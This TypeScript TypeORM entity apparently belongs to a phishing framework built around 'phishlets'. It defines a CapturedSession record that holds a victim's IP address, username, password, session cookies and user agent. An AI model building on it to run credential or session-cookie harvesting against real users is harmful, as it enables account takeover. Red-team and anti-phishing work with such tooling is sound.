import { Entity, PrimaryGeneratedColumn, Column, CreateDateColumn, ManyToOne, JoinColumn } from 'typeorm';
import { Phishlet } from './Phishlet';

@Entity()
export class CapturedSession {
    @PrimaryGeneratedColumn('uuid')
    id: string;

    @Column()
    phishletId: string;

    @ManyToOne(() => Phishlet)
    @JoinColumn({ name: 'phishletId' })
    phishlet: Phishlet;

    @Column()
    ipAddress: string;

    @Column({ type: 'simple-json' })
    capturedData: {
        username?: string;
        password?: string;
        cookies?: any;
        userAgent?: string;
    };

    @Column({ default: 'active' })
    status: 'active' | 'expired' | 'compromised';

    @CreateDateColumn({ type: 'datetime' })
    createdAt: Date;
}
